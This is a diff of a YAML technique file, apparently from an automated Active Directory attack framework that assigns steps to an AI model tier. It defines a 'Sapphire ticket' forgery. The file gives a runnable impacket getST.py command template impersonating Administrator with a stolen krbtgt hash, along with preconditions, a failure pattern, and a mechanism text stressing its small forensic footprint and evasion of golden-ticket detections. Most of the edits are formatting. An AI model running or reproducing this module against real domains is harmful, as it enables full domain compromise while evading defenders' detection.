@@ -1,7 +1,6 @@
 name: saphire_ticket
 category: ad
-description: Sapphire ticket — S4U2self+U2U + krbtgt re-encrypt for stealthy forged
-  TGT
+description: "Sapphire ticket \u2014 S4U2self+U2U + krbtgt re-encrypt for stealthy forged TGT"
 preconditions:
 - has_krbtgt_hash
 - has_cred
@@ -11,8 +10,7 @@ parameters:
   domain: from_engagement.domain
   krbtgt_hash: from_cred.krbtgt_nt_hash
   target_user: Administrator
-command_template: getST.py -k -no-pass -self -altservice cifs/dc.{domain} -impersonate
-  {target_user} '{domain}/{username}'
+command_template: getST.py -k -no-pass -self -altservice cifs/dc.{domain} -impersonate {target_user} '{domain}/{username}'
 parser: impacket_parser
 expected_effects:
 - saphire_ticket_forged
@@ -22,17 +20,22 @@ falsifier:
   pattern: KDC_ERR|KRB_AP_ERR|ACCESS_DENIED|denied
   timeout: 45
 model_tier: sonnet
-mechanism: 'Request a TGS via S4U2self+U2U as a target user, then re-encrypt with
-  the krbtgt key
-
-  to forge a TGT. Lower forensic footprint than golden ticket — the source TGS comes
-
-  from a real KDC interaction, only the final re-encrypt is local. Bypasses many
-
-  golden-ticket detections that look for TGT artifacts inconsistent with normal traffic.
-
-  '
+mechanism: "Request a TGS via S4U2self+U2U as a target user, then re-encrypt with the krbtgt key\nto forge a TGT. Lower forensic\
+  \ footprint than golden ticket \u2014 the source TGS comes\nfrom a real KDC interaction, only the final re-encrypt is local.\
+  \ Bypasses many\ngolden-ticket detections that look for TGT artifacts inconsistent with normal traffic.\n"
 references:
   ocd_mindmap: 'Branch 13: Sapphire Ticket'
   hacktricks: windows-hardening/active-directory-methodology/silver-ticket.md
+  ocd_mindmap_node_ids:
+  - 337bc19c57
+  - 4c8a1de7c1
+  - 8f7e2cdb5f
+  - 96696bc47f
+  - b2d42093e6
+  - c21b7a4047
+  - cc03abded4
+  - f0b67db65c
+  - f41470d83a
+  - f45806da29
+  - fe998000ba
 hacktricks_ref: windows-hardening/cobalt-strike.md
